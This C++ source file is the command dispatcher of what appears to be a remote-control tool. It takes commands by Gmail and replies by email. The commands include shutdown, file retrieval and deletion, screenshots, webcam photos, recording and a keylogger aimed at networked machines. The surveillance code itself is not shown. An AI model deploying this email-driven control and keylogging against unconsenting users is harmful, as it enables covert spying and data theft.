#include "process_cmd.h"

const std::string ProcessCommand::directory = "temp\\";

ProcessCommand::ProcessCommand() : message(), response() {
    updateSenderQuery();
    commands.insert({{"shutdown", new ShutdownCommand},
                     {"getips", new GetIPsCommand},
                     {"restart", new RestartCommand},
                     {"listapp", new ListAppCommand},
                     {"startapp", new StartAppCommand},
                     {"stopapp", new StopAppCommand},
                     {"listser", new ListSerCommand},
                     {"startser", new StartSerCommand},
                     {"stopser", new StopSerCommand},
                     {"listfile", new ListFileCommand},
                     {"getfile", new GetFileCommand},
                     {"deletefile", new DeleteFileCommand},
                     {"screenshot", new ScreenshotCommand},
                     {"takephoto", new TakePhotoCommand},
                     {"startrecord", new StartRecordCommand},
                     {"stoprecord", new StopRecordCommand},
                     {"startkeylog", new StartKeylogCommand},
                     {"stopkeylog", new StopKeylogCommand},
                     {"help", new HelpCommand}
                     });
}

ProcessCommand::~ProcessCommand() {
    for (auto it = commands.begin(); it != commands.end(); it++) {
        delete it->second;
    }
    commands.clear();
}

void ProcessCommand::updateSenderQuery() {
    std::ifstream fin("valid_email.txt");
    if (!fin.good()) {
        sender_query = "is:unread";
        return;
    }

    sender_query.clear();
    std::string email;
    if (!fin.eof()) {
        fin >> email;
        if (email.empty()) {
            sender_query = "is:unread";
            fin.close();
            return;
        }
        sender_query += "from:" + email + ' ';
        email.clear();
    }
    while (!fin.eof()) {
        fin >> email;
        if (email.empty()) break;
        sender_query += "OR from:" + email + ' ';
        email.clear();
    }
    sender_query += "is:unread";
    fin.close();
}

std::string ProcessCommand::getCommand() const{
    std::string command = message.getSubject();
    if (commands.find(command) == commands.end()) return "invalid";
    return command;
}

bool ProcessCommand::isValidIP(const std::string &ip) const{
    // Define a regular expression for a valid IPv4 address
    const std::regex pattern("^(\\d{1,3})\\.(\\d{1,3})\\.(\\d{1,3})\\.(\\d{1,3})$");
    std::smatch match;

    // Check if IP matches the pattern
    if (regex_match(ip, match, pattern)) {
        // Validate each octet is within the range 0-255
        for (int i = 1; i <= 4; ++i) {
            int octet = std::stoi(match[i].str());
            if (octet < 0 || octet > 255) {
                return false;
            }
        }
        return true;
    }
    return false;
}

std::string ProcessCommand::getIP() const{
    std::string body = message.getBody();
    std::string ip = body.substr(0, body.find("\r\n"));
    if (isValidIP(ip))
        return ip;
    else
        return "invalid";
}

std::string ProcessCommand::getParameter() const{
    std::string body = message.getBody();
    int idx = body.find("\r\n");
    if (idx == body.npos) {
        return "";
    }
    std::string param = body.substr(idx + 2);
    return param;
}

//! Remember to delete couts
void ProcessCommand::executeCommand(Client& client) {
    if (message.isEmpty()) return;

	std::string command = getCommand();
    std::string param = getParameter();

    // check command
    if (command == "invalid") {
        std::string error_response;
        error_response = "You have entered the wrong command.\n";
        error_response += "Please try again, or send command \"help\" to get the list of available commands.";
        sendResponse(error_response);
        message.clear();
        std::cerr << "Wrong command" << std::endl;
        return;
    }

    // commands that does not require connection to server
    if (command == "help" || command == "getips") {
        commands[command]->execute(client);
        response = commands[command]->getResponse();
        processResponse();
        message.clear();
        std::cout << "Command \"" << command << "\" has been executed.\n";
        return;
    }

    // check ip
    std::string ip = getIP();
	SOCKET server_socket = client.getServerSocket(ip);
    if (server_socket == INVALID_SOCKET) {
        std::string error_response;
        error_response = "You have entered an invalid IP address.\n";
        error_response += "Please try again, or send command \"getips\" to get the list of available computers.";
        sendResponse(error_response);
        message.clear();
        std::cerr << "Invalid socket for IP: " << ip << std::endl;
        response = R"({"status": )" + std::to_string(1) + R"(, "file": ")" + "" + R"(", "message": ")" + "Invalid socket for IP: " + ip + R"("})";
    }
    else{
        commands[command]->setCommandInfo(ip, command, param);
        commands[command]->execute(client);
        response = commands[command]->getResponse();
    }

    processResponse();
    message.clear();
}

bool ProcessCommand::getLatestMessage() {
    message = gmailapi.getLatestMessage(sender_query);
    if (message.isEmpty()) return false;
    gmailapi.markAsRead(message.getGmailID());
    return true;
}


void ProcessCommand::sendResponse(const std::string& response_string, const Attachment& attachment) {
    Message response;
    response.setSubject("Re: " + message.getSubject());
    response.setBody(response_string);

    gmailapi.replyMessage(message, response, attachment);
}

void ProcessCommand::processResponse() {
    json j;
    try {
        j = json::parse(response);
        if (j["status"] == -1) {
            sendResponse("An error has occur when executing the command");
            return;
        }
        if (j["status"] == SUCCESS && j["file"] != "")
            sendResponse(j["message"], Attachment(directory + std::string(j["file"]), j["file"]));
        else
            sendResponse(j["message"]);

    }
    catch (std::exception& e) {
        sendResponse("An error has occur when processing server response.");
    }
}